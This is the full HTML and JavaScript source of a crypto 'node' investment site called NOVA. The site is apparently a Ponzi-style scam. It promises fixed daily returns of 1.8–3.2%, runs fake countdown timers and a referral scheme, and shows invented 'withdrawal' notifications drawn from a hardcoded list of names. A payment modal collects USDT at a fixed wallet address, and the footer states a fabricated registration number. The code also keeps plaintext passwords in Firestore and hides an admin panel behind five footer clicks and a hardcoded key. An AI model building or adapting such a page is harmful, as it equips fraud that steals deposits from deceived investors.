<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Enterprise Institutional Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; --gold: #FFD700; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); line-height: 1.6; }
        
        /* Glassmorphism & Layout */
        .glass { background: rgba(17, 34, 64, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(100, 255, 218, 0.1); border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; text-align: center; border-bottom: 1px solid #112240; }
        
        #dashboard { display: none; padding: 20px; max-width: 1200px; margin: auto; animation: fadeIn 0.8s ease; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { text-align: center; border-top: 3px solid var(--accent); }
        .stat-card h2 { margin: 5px 0; color: var(--accent); font-size: 1.8rem; }

        /* Nodes Marketplace */
        .node-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
        .node-card { background: var(--card-bg); border-radius: 12px; overflow: hidden; transition: 0.3s; position: relative; border: 1px solid #233554; }
        .node-card:hover { transform: translateY(-8px); border-color: var(--accent); }
        .node-img { width: 100%; height: 160px; object-fit: cover; filter: brightness(0.7); }
        .node-info { padding: 15px; }
        .timer-box { font-family: monospace; color: var(--gold); font-size: 13px; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 4px; display: inline-block; margin: 10px 0; }

        /* Interactive Components */
        .btn-prime { width: 100%; padding: 12px; background: var(--accent); color: var(--primary); border: none; border-radius: 5px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-prime:hover { filter: brightness(1.1); transform: scale(1.02); }
        input, select { width: 100%; padding: 12px; background: #020c1b; border: 1px solid #233554; color: white; border-radius: 5px; margin: 10px 0; box-sizing: border-box; }
        
        /* Notifications & Support */
        .toast-notif { position: fixed; bottom: 20px; left: 20px; background: var(--accent); color: var(--primary); padding: 12px 20px; border-radius: 50px; font-weight: bold; font-size: 12px; display: none; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5); border: 2px solid white; }
        .support-fab { position: fixed; bottom: 20px; right: 20px; background: #25D366; color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 10px 25px rgba(0,0,0,0.4); z-index: 1000; }
        .vip-badge { background: var(--gold); color: black; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 900; vertical-align: middle; }

        /* Legal */
        .legal-box { font-size: 12px; color: var(--text-dim); margin-top: 50px; padding: 20px; border-top: 1px solid #233554; }
        #auth-page { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000') center/cover no-repeat; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="toast" class="toast-notif"></div>

    <div class="support-fab" onclick="window.open('https://wa.me/YOUR_NUMBER')">
        <svg width="35" height="35" fill="white" viewBox="0 0 24 24"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766 0-3.18-2.587-5.771-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.751-2.874-2.502-2.961-2.617-.087-.116-.708-.94-.708-1.793s.448-1.273.607-1.446c.159-.173.346-.217.462-.217s.231.006.332.009c.109.004.258-.041.405.314s.506 1.231.549 1.318c.043.087.072.188.014.304s-.087.188-.174.289c-.087.101-.182.226-.26.304-.089.089-.181.185-.078.361.103.176.458.756.982 1.222.674.599 1.242.785 1.416.872s.275.066.376-.052c.101-.118.434-.506.549-.679.116-.173.231-.144.39-.087s1.011.477 1.184.564.289.13.332.202c.045.072.045.419-.1.824z"/></svg>
    </div>

    <div class="ticker"><marquee>NOVA ECOSYSTEM ACTIVE | TOTAL LIQUIDITY: 4,281,900 USDT | ALL NODES SYNCED | BTC: $67,432.10</marquee></div>

    <div id="auth-page">
        <div class="glass" style="max-width: 400px; width: 90%;">
            <h2 style="text-align:center; color:var(--accent); letter-spacing:3px;">NOVA.</h2>
            <p style="text-align:center; font-size:11px; margin-bottom:20px;">INSTITUTIONAL ACCESS ONLY</p>
            <input type="text" id="username" placeholder="User ID">
            <input type="password" id="password" placeholder="Secure Key">
            <button class="btn-prime" onclick="handleAuth()" id="authBtn">Authorize</button>
            <p id="toggleText" style="text-align:center; font-size:12px; margin-top:15px; cursor:pointer; color:var(--accent);" onclick="toggleAuth()">Request Membership</p>
        </div>
    </div>

    <div id="dashboard">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:30px;">
            <div>
                <h2 style="margin:0;">SYSTEM: <span style="color:var(--accent);">ACTIVE</span></h2>
                <small id="userDisplay"></small>
            </div>
            <button onclick="logout()" style="background:none; border:1px solid #444; color:gray; cursor:pointer; padding:5px 15px; border-radius:4px;">Terminate Session</button>
        </div>

        <div class="stats-grid">
            <div class="glass stat-card"><h2>$0.00</h2><p>Total Balance</p></div>
            <div class="glass stat-card"><h2>$0.00</h2><p>Active Nodes</p></div>
            <div class="glass stat-card"><h2>$0.00</h2><p>24h Yield</p></div>
            <div class="glass stat-card"><h2>$0.00</h2><p>Ref. Bonus</p></div>
        </div>

        <div class="glass">
            <h4 style="margin-top:0;">Your Network Link</h4>
            <div style="display:flex; gap:10px;">
                <input type="text" id="refLink" readonly style="margin:0;">
                <button class="btn-prime" style="width:120px;" onclick="copyRef()">COPY LINK</button>
            </div>
        </div>

        <h3>Infrastructure Marketplace</h3>
        <div class="node-container">
            <div class="node-card">
                <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc51?auto=format&fit=crop&w=600" class="node-img">
                <div class="node-info">
                    <h4>GENESIS NODE (S1)</h4>
                    <p>Activation Cost: <span style="color:var(--accent);">100 USDT</span></p>
                    <p>Daily Reward: <span style="color:var(--accent);">1.8%</span></p>
                    <div class="timer-box">Activation Window: 23:59:01</div>
                    <button class="btn-prime" onclick="openDeposit('Genesis S1', 100)">Purchase Node</button>
                </div>
            </div>
            <div class="node-card">
                <img src="https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=600" class="node-img">
                <div class="node-info">
                    <h4>TITAN NODE (S2)</h4>
                    <p>Activation Cost: <span style="color:var(--accent);">500 USDT</span></p>
                    <p>Daily Reward: <span style="color:var(--accent);">2.5%</span></p>
                    <div class="timer-box">Activation Window: 47:58:12</div>
                    <button class="btn-prime" onclick="openDeposit('Titan S2', 500)">Purchase Node</button>
                </div>
            </div>
            <div class="node-card">
                <img src="https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&w=600" class="node-img">
                <div class="node-info">
                    <h4>NOVA CORE (S3)</h4>
                    <p>Activation Cost: <span style="color:var(--accent);">2,500 USDT</span></p>
                    <p>Daily Reward: <span style="color:var(--accent);">3.2%</span></p>
                    <div class="timer-box">Activation Window: 71:55:45</div>
                    <button class="btn-prime" onclick="openDeposit('Nova Core S3', 2500)">Purchase Node</button>
                </div>
            </div>
        </div>

        <div class="glass" style="margin-top:30px;">
            <h3>Transaction History</h3>
            <div id="history" style="font-size:12px; color:var(--text-dim);">No active sessions or deposits found.</div>
        </div>

        <div class="legal-box">
            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap:40px;">
                <div>
                    <h4 style="color:white;">Corporate Identity</h4>
                    <p>NOVA Protocol Singapore. Registered No: SG-882190-X. Institutional digital asset management and node validation services since 2024.</p>
                </div>
                <div>
                    <h4 style="color:white;">Assistance & FAQ</h4>
                    <p><b>Withdrawals:</b> Processed within 24 hours of request.</p>
                    <p><b>Security:</b> 256-bit encryption with decentralized cold storage validation.</p>
                </div>
            </div>
            <center style="margin-top:40px;">
                <p onclick="triggerAdmin()" id="secret-trigger">Privacy Policy | AML Compliance | Terms of Service</p>
                <p style="font-size:10px;">&copy; 2026 NOVA CAPITAL GLOBAL. ALL RIGHTS RESERVED.</p>
            </center>
        </div>
    </div>

    <div id="paymentModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; align-items:center; justify-content:center;">
        <div class="glass" style="width:90%; max-width:400px; border:1px solid var(--accent);">
            <h3 id="modalTitle">Activate Node</h3>
            <p style="font-size:13px;">Send exactly <b id="modalAmt" style="color:var(--accent);"></b> USDT to the secure address:</p>
            <div onclick="copyWallet()" style="background:#020c1b; padding:15px; border-radius:5px; color:var(--accent); font-family:monospace; text-align:center; font-size:12px; border:1px dashed #444; cursor:pointer;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>
            <input type="text" id="tid" placeholder="Transaction Hash / TID">
            <label style="font-size:11px; color:gray;">Upload Screen Proof (Base64 Encoding):</label>
            <input type="file" id="proof" accept="image/*">
            <button class="btn-prime" onclick="submitFinal()">Submit Validation</button>
            <button onclick="closeModal()" style="background:none; border:none; color:gray; width:100%; margin-top:10px; cursor:pointer;">Cancel</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLogin = true;

        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('authBtn').innerText = isLogin ? "Authorize" : "Join Protocol";
            document.getElementById('auth-title').innerText = isLogin ? "TERMINAL LOGIN" : "REQUEST MEMBERSHIP";
            document.getElementById('toggleText').innerText = isLogin ? "New? Request Membership" : "Back to Login";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Credentials required, sweetie.");
            
            const userRef = doc(db, "users", u);
            const snap = await getDoc(userRef);

            if(isLogin) {
                if(snap.exists() && snap.data().password === p) {
                    sessionStorage.setItem("nova_user", u);
                    location.reload();
                } else { alert("Authorization Failed."); }
            } else {
                await setDoc(userRef, { password: p, balance: 0, ref: u + "_ref" });
                alert("Protocol Registered. Please login.");
                toggleAuth();
            }
        };

        // UI LOGIC
        function showDashboard() {
            const user = sessionStorage.getItem("nova_user");
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.getElementById('userDisplay').innerHTML = `Identity: ${user} <span class="vip-badge">GOLD MEMBER</span>`;
            document.getElementById('refLink').value = `${window.location.origin}/nova/?ref=${user}`;
            startToasts();
        }

        window.openDeposit = (name, amt) => {
            document.getElementById('modalTitle').innerText = `Activate ${name}`;
            document.getElementById('modalAmt').innerText = amt;
            document.getElementById('paymentModal').style.display = 'flex';
        };

        window.closeModal = () => document.getElementById('paymentModal').style.display = 'none';

        window.submitFinal = async () => {
            const tid = document.getElementById('tid').value;
            const fileInput = document.getElementById('proof');
            if(!tid || fileInput.files.length === 0) return alert("TID and Proof needed, sweetie.");
            
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "deposits", `tx_${Date.now()}`), {
                    user: sessionStorage.getItem("nova_user"),
                    tid: tid,
                    proof: reader.result,
                    status: "Pending",
                    timestamp: new Date().toLocaleString()
                });
                alert("Validation request submitted to global nodes.");
                closeModal();
            };
            reader.readAsDataURL(fileInput.files[0]);
        };

        // SOCIAL PROOF TOASTS
        const names = ["CryptoMaster", "John_Wealth", "Sana_99", "Alpha_Shark", "Nova_Investor", "M_Ahmed"];
        function startToasts() {
            setInterval(() => {
                const toast = document.getElementById('toast');
                const name = names[Math.floor(Math.random()*names.length)];
                const amt = (Math.random()*500 + 50).toFixed(2);
                toast.innerHTML = `🛡️ <b>${name}</b> just withdrew <b>${amt} USDT</b>`;
                toast.style.display = 'block';
                setTimeout(() => toast.style.display = 'none', 5000);
            }, 15000);
        }

        // SECRET ADMIN TRIGGER
        let clicks = 0;
        window.triggerAdmin = async () => {
            clicks++;
            if(clicks === 5) {
                const pass = prompt("Master Administrative Key:");
                if(pass === "nova_boss_786") {
                    const snap = await getDocs(collection(db, "deposits"));
                    let h = `<div style="background:#020c1b; color:white; padding:20px;"><button onclick="location.reload()">Exit</button><h2>Audit Log</h2><table border="1" style="width:100%; border-collapse:collapse;"><tr><th>User</th><th>TID</th><th>Proof</th></tr>`;
                    snap.forEach(d => {
                        const data = d.data();
                        h += `<tr><td>${data.user}</td><td>${data.tid}</td><td><img src="${data.proof}" width="120" onclick="window.open(this.src)"></td></tr>`;
                    });
                    document.body.innerHTML = h + `</table></div>`;
                }
                clicks = 0;
            }
        };

        window.copyWallet = () => { navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2"); alert("Address Copied!"); };
        window.copyRef = () => { navigator.clipboard.writeText(document.getElementById('refLink').value); alert("Link Copied!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("nova_user")) showDashboard();
    </script>
</body>
</html>
